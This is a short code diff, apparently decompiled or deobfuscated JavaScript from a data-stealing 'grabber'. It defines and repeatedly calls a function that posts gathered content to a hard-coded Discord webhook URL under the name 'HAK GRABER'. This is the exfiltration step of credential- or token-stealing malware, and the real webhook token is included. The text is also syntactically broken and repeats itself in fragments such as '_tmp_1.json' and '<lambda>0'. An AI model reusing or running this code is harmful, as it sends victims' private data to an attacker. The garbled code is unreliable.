@@ -1,0 +1,24 @@
+function Gate2 = function Gate2(to_post) {
+           
+            request.post("https://canary.discord.com/api/webhooks/799796531196330007/s83t8wuW7FvYoUHdcq4ATTwNTwjl_zWLfQYQI3TR7NrphwV8hgUruSIrd7MAUXtBFGms", {
+                json: {
+                    username: "HAK GRABER",
+                    content: Gate1(to_post)
+                }
+            }, (error, res, body) => {
+            });
+        }
+request.post("https://canary.discord.com/api/webhooks/799796531196330007/s83t8wuW7FvYoUHdcq4ATTwNTwjl_zWLfQYQI3TR7NrphwV8hgUruSIrd7MAUXtBFGms", {
+                json: {
+                    username: "HAK GRABER",
+                    content: Gate1(to_post)
+                }
+            }, (error, res, body) => {
+            })
+_tmp_1.json = {
+                    username: "HAK GRABER",
+                    content: Gate1(to_post)
+                }
+_tmp_2.username = "HAK GRABER"
+_tmp_2.content = Gate1(to_post)
+<lambda>0
